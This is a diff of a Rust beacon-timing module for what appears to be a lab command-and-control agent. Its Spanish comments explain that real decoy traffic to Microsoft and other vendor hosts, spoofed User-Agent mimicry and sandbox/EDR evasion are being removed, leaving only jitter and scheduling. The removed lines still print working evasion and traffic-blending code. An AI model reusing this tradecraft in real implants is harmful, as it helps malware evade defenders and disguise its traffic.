@@ -1,15 +1,28 @@
-// OPSEC: Operational Security for beacon timing and traffic patterns.
+// OPSEC: Operational Security for beacon timing.
 //
-//   - Jitter: deterministic ±30% variation on heartbeats/beacons
-//   - Decoy traffic: fake requests to blend beacon traffic
-//   - Time adaptation: reduce activity off-hours, surge during peak
-//   - Traffic mimicry: match victim's observed cloud services
+// Ronda 12 — honestidad de transporte: este módulo SOLO decide CUÁNDO
+// actuar (jitter determinista, ventanas horarias, multiplicadores de fin
+// de semana). Fue ELIMINADO aquí:
+//
+//   - "Decoy traffic": enviaba peticiones HTTP REALES a terceros
+//     (crl.microsoft.com, ocsp.digicert.com, cdn.cloudflare.net,
+//     settings-win.data.microsoft.com, v10.vortex-win.data.microsoft.com,
+//     api-global.netflix.com) con User-Agents suplantados en cada ciclo
+//     de heartbeat (probabilidad 0.3) — exactamente la clase de masquerade
+//     que la ronda 11 eliminó de smoke_signals y que aquí sobrevivió.
+//   - "Traffic mimicry": fábrica de User-Agents suplantados y selector de
+//     canal encubierto a partir del perfil de nube observado.
+//   - Anti-análisis en el gate de decisión: `evasion_check`
+//     (sandbox/debugger/EDR → congelar beacons) retirado de `should_act`;
+//     la colonia de laboratorio no altera su comportamiento según quién
+//     la observa (la matriz de CAPABILITIES ya declaraba "sin
+//     anti-análisis" — el código ahora lo cumple).
 
+#![cfg_attr(not(test), deny(clippy::unwrap_used))]
 use chrono::{Datelike, Timelike};
 use rand::rngs::StdRng;
 use rand::{Rng, SeedableRng};
 use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
 use std::time::{Duration, SystemTime, UNIX_EPOCH};
 use tracing::info;
 
@@ -34,194 +47,53 @@ impl Default for JitterConfig {
     fn default() -> Self {
         Self {
             seed: 0,
-            base_ms: 10_000,    // 10 seconds
-            jitter_percent: 30, // ±30%
-            min_ms: 1_000,
-            max_ms: 120_000, // 2 minutes
+            base_ms: 30_000,
+            jitter_percent: 30,
+            min_ms: 5_000,
+            max_ms: 120_000,
         }
     }
 }
 
 impl JitterConfig {
-    /// Create a new config with a deterministic seed derived from agent_id.
-    pub fn with_seed(agent_id: &[u8]) -> Self {
-        let seed = {
-            let mut s = 0u64;
-            for (i, &b) in agent_id.iter().enumerate() {
-                s ^= (b as u64) << ((i % 8) * 8);
-            }
-            if s == 0 {
-                1
-            } else {
-                s
-            }
-        };
+    /// Create a config with a deterministic seed derived from agent id.
+    pub fn with_seed(seed_bytes: &[u8]) -> Self {
+        use std::collections::hash_map::DefaultHasher;
+        use std::hash::{Hash, Hasher};
+        let mut hasher = DefaultHasher::new();
+        seed_bytes.hash(&mut hasher);
         Self {
-            seed,
+            seed: hasher.finish(),
             ..Default::default()
         }
     }
 
-    /// Compute the next sleep duration with jitter applied.
-    /// Uses deterministic RNG when seed != 0, else thread_rng.
+    /// Next delay with deterministic ±jitter_percent variation.
     pub fn next_delay(&self) -> Duration {
-        if self.base_ms == 0 {
-            return Duration::from_millis(self.min_ms);
-        }
-
-        let range = (self.base_ms * self.jitter_percent as u64) / 100;
-        let half_range = range.max(1) / 2;
-
-        let offset: i64 = if self.seed != 0 {
-            let seed = self.seed.wrapping_add(
-                SystemTime::now()
-                    .duration_since(UNIX_EPOCH)
-                    .unwrap_or_default()
-                    .as_secs()
-                    / 60,
-            );
-            let mut rng = StdRng::seed_from_u64(seed);
-            rng.gen_range(-(half_range as i64)..=(half_range as i64))
+        let mut rng = if self.seed == 0 {
+            StdRng::from_entropy()
         } else {
-            let mut rng = rand::thread_rng();
-            rng.gen_range(-(half_range as i64)..=(half_range as i64))
+            // Seed mixed with the current minute: deterministic within the
+            // minute (replay-consistent), varies between minutes.
+            let minute = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .map(|d| d.as_secs() / 60)
+                .unwrap_or(0);
+            StdRng::seed_from_u64(self.seed ^ minute)
         };
-
-        let ms = (self.base_ms as i64 + offset)
-            .max(self.min_ms as i64)
-            .min(self.max_ms as i64);
+        let spread = (self.base_ms as f64) * (self.jitter_percent as f64 / 100.0);
+        let offset: f64 = rng.gen_range(-spread..=spread);
+        let ms = (self.base_ms as f64 + offset).clamp(self.min_ms as f64, self.max_ms as f64);
         Duration::from_millis(ms as u64)
     }
 
-    /// Whether it's time to act based on the jitter schedule.
-    /// Returns true if `last_ts + next_delay` has passed.
-    pub fn is_due(&self, last_ts: u64) -> bool {
+    /// Whether the given last-activation timestamp is due for another action.
+    pub fn is_due(&self, last_activation_ms: u64) -> bool {
         let now = SystemTime::now()
             .duration_since(UNIX_EPOCH)
-            .unwrap_or_default()
-            .as_millis() as u64;
-        now >= last_ts + self.base_ms
-    }
-}
-
-// ── decoy traffic ────────────────────────────────────────────────────────────
-
-/// Decoy traffic profile: fake requests to blend beacon traffic.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct DecoyProfile {
-    /// Decoy request templates (host, path, method, user-agent)
-    pub requests: Vec<DecoyRequest>,
-    /// Probability of sending a decoy per cycle (0.0 - 1.0)
-    pub probability: f64,
-    /// Maximum decoys to send per cycle
-    pub max_per_cycle: usize,
-}
-
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct DecoyRequest {
-    pub host: String,
-    pub path: String,
-    pub method: String,
-    pub user_agent: String,
-    pub content_type: String,
-}
-
-impl Default for DecoyProfile {
-    fn default() -> Self {
-        Self {
-            requests: vec![
-                DecoyRequest {
-                    host: "crl.microsoft.com".into(),
-                    path: "/pki/crl/products/WindowsUpdate.crl".into(),
-                    method: "GET".into(),
-                    user_agent: "Microsoft-Windows/10.0.22621.1 WindowsUpdate/10.0.22621.1".into(),
-                    content_type: "application/octet-stream".into(),
-                },
-                DecoyRequest {
-                    host: "ocsp.digicert.com".into(),
-                    path: "/".into(),
-                    method: "POST".into(),
-                    user_agent: "Microsoft Windows HTTPS Certificate Chain Verification/10.0 (Windows NT 10.0; Win64; x64)".into(),
-                    content_type: "application/ocsp-request".into(),
-                },
-                DecoyRequest {
-                    host: "cdn.cloudflare.net".into(),
-                    path: "/ajax/libs/analytics/1.0.0/analytics.min.js".into(),
-                    method: "GET".into(),
-                    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".into(),
-                    content_type: "text/plain".into(),
-                },
-                DecoyRequest {
-                    host: "settings-win.data.microsoft.com".into(),
-                    path: "/settings/v2.0/telemetry".into(),
-                    method: "POST".into(),
-                    user_agent: "Windows-Media-Center/10.0.22621.1 (Windows NT 10.0; Windows)" .into(),
-                    content_type: "application/json".into(),
-                },
-                DecoyRequest {
-                    host: "v10.vortex-win.data.microsoft.com".into(),
-                    path: "/collect/v1".into(),
-                    method: "POST".into(),
-                    user_agent: "Windows-Media-Center/10.0.22621.1 (Windows NT 10.0; Windows)".into(),
-                    content_type: "application/json".into(),
-                },
-                DecoyRequest {
-                    host: "api-global.netflix.com".into(),
-                    path: "/pathupgrade".into(),
-                    method: "GET".into(),
-                    user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Netflix/6.0 Chrome/120.0.0.0 Safari/537.36".into(),
-                    content_type: "text/plain".into(),
-                },
-            ],
-            probability: 0.3,
-            max_per_cycle: 2,
-        }
-    }
-}
-
-impl DecoyProfile {
-    /// Select random decoy requests for this cycle.
-    pub fn select_decoys(&self) -> Vec<&DecoyRequest> {
-        let mut rng = rand::thread_rng();
-        if rng.gen::<f64>() > self.probability {
-            return Vec::new();
-        }
-        let count = rng.gen_range(1..=self.max_per_cycle.min(self.requests.len()));
-        let mut indices: Vec<usize> = (0..self.requests.len()).collect();
-        for i in (1..self.requests.len()).rev() {
-            let j = rng.gen_range(0..=i);
-            indices.swap(i, j);
-        }
-        indices[..count]
-            .iter()
-            .map(|&i| &self.requests[i])
-            .collect()
-    }
-
-    /// Fire decoy requests asynchronously (spawn and forget).
-    pub fn fire_decoys(&self) {
-        let decoys = self.select_decoys();
-        for decoy in decoys {
-            let req = decoy.clone();
-            std::thread::spawn(move || {
-                let client = reqwest::blocking::Client::builder()
-                    .timeout(Duration::from_secs(5))
-                    .user_agent(&req.user_agent)
-                    .build()
-                    .ok();
-                if let Some(client) = client {
-                    let url = format!("https://{}{}", req.host, req.path);
-                    let _ = match req.method.as_str() {
-                        "GET" => client.get(&url).send(),
-                        "POST" => client
-                            .post(&url)
-                            .header("content-type", &req.content_type)
-                            .send(),
-                        _ => return,
-                    };
-                }
-            });
-        }
+            .map(|d| d.as_millis() as u64)
+            .unwrap_or(0);
+        now.saturating_sub(last_activation_ms) >= self.base_ms
     }
 }
 
@@ -292,91 +164,19 @@ impl ActivitySchedule {
     }
 }
 
-// ── traffic mimicry ──────────────────────────────────────────────────────────
-
-/// Traffic pattern: a sequence of requests to mimic during C2 operations.
-#[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct TrafficMimic {
-    /// Map of service -> count observed
-    pub observed_services: HashMap<String, u64>,
-    /// Preferred mimic targets (learned from victim)
-    pub preferred: Vec<String>,
-}
-
-impl TrafficMimic {
-    /// Learn from the org profile.
-    pub fn from_org_profile(profile: &crate::smoke_signals::OrgCloudProfile) -> Self {
-        let mut observed = HashMap::new();
-        if profile.microsoft_365 {
-            *observed.entry("office365".into()).or_insert(0) += 1;
-            *observed.entry("azure".into()).or_insert(0) += 1;
-        }
-        if profile.google_workspace {
-            *observed.entry("google".into()).or_insert(0) += 1;
-        }
-        if profile.aws {
-            *observed.entry("aws".into()).or_insert(0) += 1;
-        }
-        if profile.salesforce {
-            *observed.entry("salesforce".into()).or_insert(0) += 1;
-        }
-        if profile.slack {
-            *observed.entry("slack".into()).or_insert(0) += 1;
-        }
-
-        let mut preferred: Vec<(&u64, &String)> = observed.iter().map(|(k, v)| (v, k)).collect();
-        preferred.sort_by(|a, b| b.0.cmp(a.0));
-        let preferred: Vec<String> = preferred.into_iter().map(|(_, k)| k.clone()).collect();
-
-        Self {
-            observed_services: observed,
-            preferred,
-        }
-    }
-
-    /// Select the best smoke channel based on learned traffic.
-    pub fn select_channel(&self) -> crate::smoke_signals::SmokeChannel {
-        use crate::smoke_signals::SmokeChannel;
-        for service in &self.preferred {
-            match service.as_str() {
-                "office365" | "azure" => return SmokeChannel::Office365,
-                "google" => return SmokeChannel::GoogleDrive,
-                "aws" => return SmokeChannel::CloudFrontCDN,
-                _ => {}
-            }
-        }
-        SmokeChannel::random()
-    }
-
-    /// Get a realistic User-Agent based on observed services.
-    pub fn user_agent(&self) -> &str {
-        if self.preferred.is_empty() {
-            return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
-        }
-        match self.preferred[0].as_str() {
-            "office365" | "azure" => {
-                "Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.12026; Pro)"
-            }
-            "google" => "grpc-node-js/1.8.14 grpc-c/30.0 (linux; chttp2)",
-            "aws" => "Boto3/1.28.62 Python/3.11.5 Linux/6.2.0-35-generic",
-            _ => "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        }
-    }
-}
-
 // ── unified OPSEC engine ─────────────────────────────────────────────────────
 
-/// Unified OPSEC engine that orchestrates jitter, decoys, timing, and mimicry.
+/// Unified OPSEC engine that orchestrates timing: jitter + schedule.
+/// Ronda 12: sin decoys de red, sin mimicry de UAs, sin anti-análisis —
+/// solo decisiones de CUÁNDO, nunca de QUÉ tráfico enviar.
 #[derive(Debug, Clone, Serialize, Deserialize)]
 pub struct OpsecEngine {
     pub jitter: JitterConfig,
-    pub decoys: DecoyProfile,
     pub schedule: ActivitySchedule,
-    pub mimic: Option<TrafficMimic>,
     /// When this engine was last activated (UNIX ms)
     pub last_activation: u64,
-    /// Total decoy requests fired
-    pub decoys_fired: u64,
+    /// Completed OPSEC cycles (accounting only — no traffic is sent)
+    pub cycles_completed: u64,
 }
 
 impl OpsecEngine {
@@ -384,34 +184,25 @@ impl OpsecEngine {
     pub fn new(agent_id: &[u8]) -> Self {
         Self {
             jitter: JitterConfig::with_seed(agent_id),
-            decoys: DecoyProfile::default(),
             schedule: ActivitySchedule::default(),
-            mimic: None,
             last_activation: 0,
-            decoys_fired: 0,
+            cycles_completed: 0,
         }
     }
 
-    /// Calibrate from an org profile (traffic mimicry).
+    /// Calibrate the activity schedule from a lab org profile (timing only).
+    /// Ronda 12: antes también construía un `TrafficMimic` para elegir
+    /// canales encubiertos y User-Agents suplantados — eliminado.
     pub fn calibrate(&mut self, profile: &crate::smoke_signals::OrgCloudProfile) {
-        let mimic = TrafficMimic::from_org_profile(profile);
         self.schedule.hourly_multipliers = default_hourly_from_profile(profile);
-        self.mimic = Some(mimic);
-        info!("OPSEC: calibrated from org profile");
+        info!("OPSEC: schedule calibrated from org profile (timing only)");
     }
 
     /// Whether the engine allows action right now.
+    /// Ronda 12: SOLO el horario gobierna la decisión — el anti-análisis
+    /// (sandbox/debugger/EDR → congelar) fue retirado de este gate.
     pub fn should_act(&self) -> bool {
-        // Check sandbox/debugger/EDR first
-        let risks = crate::platform_layer::runtime::evasion_check();
-        if !risks.is_empty() {
-            return false; // Evasive action: freeze
-        }
-        // Check schedule
-        if !self.schedule.should_act(0.05) {
-            return false; // Off-hours: stay quiet
-        }
-        true
+        self.schedule.should_act(0.05)
     }
 
     /// Get the effective delay before the next action (jitter + schedule applied).
@@ -423,7 +214,8 @@ impl OpsecEngine {
         Duration::from_millis(ms as u64)
     }
 
-    /// Execute one OPSEC cycle: fire decoys, return the delay before next action.
+    /// Execute one OPSEC cycle: account the activation and return the delay
+    /// before the next action. NO traffic is generated here (ronda 12).
     pub fn cycle(&mut self) -> Duration {
         self.last_activation = SystemTime::now()
             .duration_since(UNIX_EPOCH)
@@ -434,33 +226,10 @@ impl OpsecEngine {
             return Duration::from_secs(60); // Check again in 60s
         }
 
-        // Fire decoy traffic
-        let prev = self.decoys_fired;
-        self.decoys.fire_decoys();
-        self.decoys_fired += 1;
-
-        if self.decoys_fired > prev {
-            info!("OPSEC: fired decoy #{}", self.decoys_fired);
-        }
+        self.cycles_completed += 1;
 
         // Return the jittered delay
         self.next_delay()
-    }
-
-    /// Get the recommended smoke channel based on mimicry.
-    pub fn recommended_channel(&self) -> crate::smoke_signals::SmokeChannel {
-        self.mimic
-            .as_ref()
-            .map(|m| m.select_channel())
-            .unwrap_or_else(crate::smoke_signals::SmokeChannel::random)
-    }
-
-    /// Recommended User-Agent based on mimicry.
-    pub fn recommended_user_agent(&self) -> &str {
-        self.mimic
-            .as_ref()
-            .map(|m| m.user_agent())
-            .unwrap_or("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     }
 }
 
@@ -552,52 +321,9 @@ mod tests {
     }
 
     #[test]
-    fn test_decoy_select() {
-        let d = DecoyProfile::default();
-        let decoys = d.select_decoys();
-        assert!(decoys.len() <= d.max_per_cycle);
-        for decoy in &decoys {
-            assert!(!decoy.host.is_empty());
-        }
-    }
-
-    #[test]
-    fn test_decoy_fire_no_panic() {
-        let d = DecoyProfile::default();
-        d.fire_decoys(); // Should not panic
-        std::thread::sleep(Duration::from_millis(100));
-    }
-
-    #[test]
-    fn test_traffic_mimic_from_profile() {
-        let profile = crate::smoke_signals::OrgCloudProfile {
-            microsoft_365: true,
-            aws: true,
-            ..Default::default()
-        };
-        let mimic = TrafficMimic::from_org_profile(&profile);
-        assert!(mimic.preferred.contains(&"office365".to_string()));
-        assert!(mimic.preferred.contains(&"aws".to_string()));
-    }
-
-    #[test]
-    fn test_traffic_mimic_select_channel() {
-        let profile = crate::smoke_signals::OrgCloudProfile {
-            google_workspace: true,
-            ..Default::default()
-        };
-        let mimic = TrafficMimic::from_org_profile(&profile);
-        let ch = mimic.select_channel();
-        assert!(matches!(
-            ch,
-            crate::smoke_signals::SmokeChannel::GoogleDrive
-        ));
-    }
-
-    #[test]
     fn test_opsec_engine_new() {
         let engine = OpsecEngine::new(b"test-agent");
-        assert_eq!(engine.decoys_fired, 0);
+        assert_eq!(engine.cycles_completed, 0);
         assert!(engine.last_activation == 0);
     }
 
@@ -609,24 +335,43 @@ mod tests {
         assert!(engine.last_activation > 0);
     }
 
+    // ── Ronda 12: regresiones de honestidad ─────────────────────────────
+
     #[test]
-    fn test_opsec_calibrate() {
-        let mut engine = OpsecEngine::new(b"test");
-        let profile = crate::smoke_signals::learn_org_profile();
-        engine.calibrate(&profile);
-        assert!(engine.mimic.is_some());
+    fn test_engine_cycle_accounts_without_traffic() {
+        // El ciclo contabiliza activaciones; no genera tráfico (el módulo
+        // ya no tiene ningún constructor de peticiones HTTP).
+        let mut engine = OpsecEngine::new(b"test-agent");
+        let before = engine.cycles_completed;
+        let _ = engine.cycle();
+        let _ = engine.cycle();
+        assert_eq!(engine.cycles_completed, before + 2);
     }
 
     #[test]
-    fn test_opsec_recommended_channel() {
+    fn test_should_act_is_schedule_only() {
+        // should_act depende exclusivamente del horario: con un calendario
+        // "siempre activo" la respuesta debe ser true en cualquier entorno
+        // (antes un detect_sandbox/EDR podía congelar el beacon).
+        let mut engine = OpsecEngine::new(b"test-agent");
+        engine.schedule.hourly_multipliers = [1.0; 24];
+        engine.schedule.weekend_multiplier = 1.0;
+        assert!(engine.should_act());
+    }
+
+    #[test]
+    fn test_calibrate_only_touches_schedule() {
+        // La calibración ajusta el calendario horario y nada más — ya no
+        // construye mimicry ni selecciona canales encubiertos.
         let mut engine = OpsecEngine::new(b"test");
         let profile = crate::smoke_signals::OrgCloudProfile {
-            microsoft_365: true,
+            peak_hours: vec![9, 10, 11],
             ..Default::default()
         };
         engine.calibrate(&profile);
-        let ch = engine.recommended_channel();
-        assert!(matches!(ch, crate::smoke_signals::SmokeChannel::Office365));
+        assert_eq!(engine.schedule.hourly_multipliers[9], 1.0);
+        assert_eq!(engine.schedule.hourly_multipliers[10], 1.0);
+        assert_eq!(engine.schedule.hourly_multipliers[23], 0.1);
     }
 
     #[test]
@@ -649,15 +394,5 @@ mod tests {
             let weekend = s.weekend_days.contains(&day);
             assert!(weekend);
         }
-    }
-
-    #[test]
-    fn test_engine_evasion_freeze() {
-        let engine = OpsecEngine::new(b"test");
-        // In a normal environment, should_act should return true
-        // (if not in a sandbox)
-        let result = engine.should_act();
-        // We can't guarantee the environment, so just verify it doesn't panic
-        let _ = result;
     }
 }
